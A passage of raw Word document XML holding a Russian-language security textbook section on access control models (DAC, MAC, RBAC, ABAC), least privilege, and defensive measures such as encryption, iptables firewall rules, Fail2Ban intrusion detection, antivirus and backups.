    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Windows. Ты можешь кликнуть правой кнопкой на файл → "Свойства" → "Безопасность" → добавить пользователя Вася и дать ему права на чтение. Это DAC.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. MAC (Mandatory Access Control) — Мандатное управление</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Система (а не пользователь) решает, кто имеет доступ. Доступ основан на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>метках секретности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (security labels).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Военные системы.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Файл помечен как "Совершенно секретно" (Top Secret)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь имеет допуск уровня "Секретно" (Secret)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Система **запретит** доступ, даже если пользователь владелец файла</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Высокий уровень защиты</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Централизованный контроль</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Негибко: нельзя быстро дать кому-то доступ</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложно настраивать</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: SELinux (Security-Enhanced Linux). В обычном Linux ты можешь сделать `chmod 777 secret.txt` (доступ всем). В SELinux, даже если ты root, система может запретить доступ, если метка безопасности не подходит.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. RBAC (Role-Based Access Control) — Ролевое управление</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Доступ основан на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>роли</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> пользователя, а не на его личности.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Компания с 1000 сотрудников.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роль "Бухгалтер"** → доступ к финансовой БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роль "Разработчик"** → доступ к репозиторию кода</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Роль "Админ"** → доступ ко всему</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Ты назначаешь пользователей на роли. Роли имеют права доступа.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легко управлять (добавил пользователя в роль "Бухгалтер" → он автоматически получил нужные права)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Масштабируемость: не нужно настраивать права для каждого пользователя</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Не подходит для сложных сценариев (например, "доступ только в рабочие часы")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Windows Active Directory. Ты создаёшь группу "HR Department", даёшь ей доступ к папке `\\server\HR\`, и добавляешь туда всех HR-сотрудников. Новый HR-менеджер пришёл? Добавляешь его в группу — всё, он автоматически получил доступ ко всем HR-ресурсам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. ABAC (Attribute-Based Access Control) — Атрибутное управление</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Доступ основан на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>атрибутах</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (характеристиках) пользователя, ресурса и контекста.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры атрибутов</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Пользователя**: роль, департамент, уровень допуска, стаж работы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Ресурса**: тип данных, владелец, секретность</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Контекста**: время, местоположение (IP-адрес), устройство</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример политики</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Разработчики могут читать production-логи только в рабочие часы (9:00-18:00) и только с офисного IP"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>"Бухгалтеры могут изменять финансовые отчёты только в конце месяца"</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Очень гибко: можно описать сложные правила</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Подходит для облачных систем (AWS IAM, Azure RBAC)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложно настраивать: нужно продумывать атрибуты и правила</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Производительность: проверка атрибутов может быть медленной</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: AWS IAM (Identity and Access Management). Политика:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Effect": "Allow",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Action": "s3:GetObject",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Resource": "arn:aws:s3:::my-bucket/*",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "Condition": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "IpAddress": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "aws:SourceIp": "192.0.2.0/24"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    },</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "DateGreaterThan": {</w:t>
        <w:br/>
        <w:t xml:space="preserve">      "aws:CurrentTime": "2025-01-01T00:00:00Z"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    }</w:t>
        <w:br/>
        <w:t xml:space="preserve">  }</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Перевод: можно читать файлы из S3-бакета `my-bucket`, но только с IP из диапазона `192.0.2.0/24` и только после 1 января 2025 года.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.5. Принцип наименьших привилегий (Principle of Least Privilege)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Суть</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Каждый пользователь/процесс должен иметь </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>минимально необходимые права</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> для выполнения своей работы. Ни больше, ни меньше.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Бухгалтеру не нужен доступ к серверам разработки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Разработчику не нужен доступ к финансовой БД</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Веб-серверу не нужны права на запись в системные файлы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Минимизация ущерба**: если аккаунт скомпрометирован (взломан), злоумышленник получит ограниченные права</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Снижение рисков**: меньше людей имеют доступ к критичным данным</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Антипример</w:t>
      </w:r>
      <w:r>
        <w:t>: Windows XP по умолчанию давал всем пользователям права администратора. Итог: любой вирус мог делать что угодно (устанавливать драйверы, менять системные файлы, отключать антивирус). Windows Vista ввела UAC (User Account Control), чтобы исправить это.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Docker-контейнеры. По умолчанию контейнер запускается от root. Но правильная практика — создать непривилегированного пользователя внутри контейнера:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>RUN useradd -m myuser</w:t>
        <w:br/>
        <w:t>USER myuser</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Теперь, если кто-то взломает контейнер, он не сможет выйти за его пределы и навредить хост-системе.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>9.1.6. Технические меры защиты</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Организационные политики — это хорошо, но без технических мер они бесполезны. Вот основные технические меры:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1. Шифрование (Encryption)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Преобразование данных в нечитаемый вид. Без ключа расшифровать невозможно.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Где используется</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Передача данных**: HTTPS (TLS/SSL), VPN (IPsec, WireGuard)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Хранение данных**: BitLocker (Windows), FileVault (macOS), LUKS (Linux)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Базы данных**: Transparent Data Encryption (TDE) в MySQL, PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Ты отправляешь пароль на сайт. Без HTTPS пароль передаётся открытым текстом — любой, кто сниффит трафик (Wireshark), увидит пароль. С HTTPS пароль шифруется AES-256, и даже если кто-то перехватит пакет, он увидит только набор байтов: `A7 3F 8D 2C ...`.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Подробнее</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> → Глава 9.02 (Криптографические методы)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2. Межсетевые экраны (Firewall)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Фильтр трафика между сетями. Разрешает/блокирует пакеты по правилам.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Packet Filter** (уровень 3-4 OSI): фильтрует по IP-адресам, портам, протоколам</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Stateful Firewall**: отслеживает состояние соединений (TCP handshake)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Application Firewall** (уровень 7 OSI): анализирует содержимое HTTP-запросов (Web Application Firewall, WAF)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: В Linux есть `iptables` / `nftables`. Правило:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT</w:t>
        <w:br/>
        <w:t>iptables -A INPUT -p tcp --dport 22 -j DROP</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Перевод: разрешить SSH-подключения (порт 22) только с локальной сети `192.168.1.0/24`, остальные — блокировать.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем</w:t>
      </w:r>
      <w:r>
        <w:t>: Если у тебя открыт порт 22 (SSH) на сервере без firewall, любой может попытаться подобрать пароль (brute force). Firewall ограничивает доступ только с определённых IP.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>3. Системы обнаружения и предотвращения вторжений (IDS/IPS)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IDS (Intrusion Detection System)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обнаруживает</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> атаки и отправляет оповещение (но не блокирует).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IPS (Intrusion Prevention System)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>обнаруживает и блокирует</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> атаки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Как работает</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сигнатуры (Signatures)**: база известных паттернов атак (например, SQL-инъекция)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аномалии (Anomalies)**: отклонения от нормального поведения (например, 1000 запросов в секунду с одного IP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Snort** (IDS/IPS с открытым исходным кодом)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Suricata** (современная альтернатива Snort)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Fail2Ban** (блокирует IP после N неудачных попыток входа)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>: Кто-то пытается подобрать пароль к SSH:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>192.168.1.100 - Failed password for root from 192.168.1.100 port 12345 ssh2</w:t>
        <w:br/>
        <w:t>192.168.1.100 - Failed password for root from 192.168.1.100 port 12346 ssh2</w:t>
        <w:br/>
        <w:t>192.168.1.100 - Failed password for root from 192.168.1.100 port 12347 ssh2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Fail2Ban</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> видит 3 неудачные попытки за минуту и блокирует IP `192.168.1.100` на 10 минут.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>4. Антивирусы и антивредоносное ПО</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Сканирование файлов на наличие вирусов, троянов, червей, рекламных программ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Методы обнаружения</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Сигнатуры**: база известных вирусов (hash файлов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Эвристический анализ**: поведенческий анализ (если программа пытается зашифровать все файлы — это ransomware)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Песочница (Sandbox)**: запуск подозрительной программы в изолированной среде</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Windows Defender** (встроенный в Windows 10/11)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Kaspersky, ESET, Avast** (коммерческие)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**ClamAV** (открытый антивирус для Linux)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Проблема</w:t>
      </w:r>
      <w:r>
        <w:t>: Антивирусы не панацея. Новые вирусы (zero-day) ещё нет в базе сигнатур. Плюс антивирус может быть отключён (если у вирусаadmin-права).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>5. Резервное копирование (Backup)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что</w:t>
      </w:r>
      <w:r>
        <w:t>: Регулярное создание копий данных, чтобы восстановить их после сбоя/атаки.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правило 3-2-1</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**3** копии данных (оригинал + 2 резервные)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**2** разных типа носителей (жёсткий диск + облако)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**1** копия в другом месте (offsite, например, другой дата-центр)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Полное (Full)**: копируется всё. Долго, но легко восстановить.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Инкрементное (Incremental)**: копируются только изменения с последнего backup. Быстро, но восстановление сложнее (нужно применять все инкременты).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Дифференциальное (Differential)**: копируются изменения с последнего полного backup. Компромисс.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
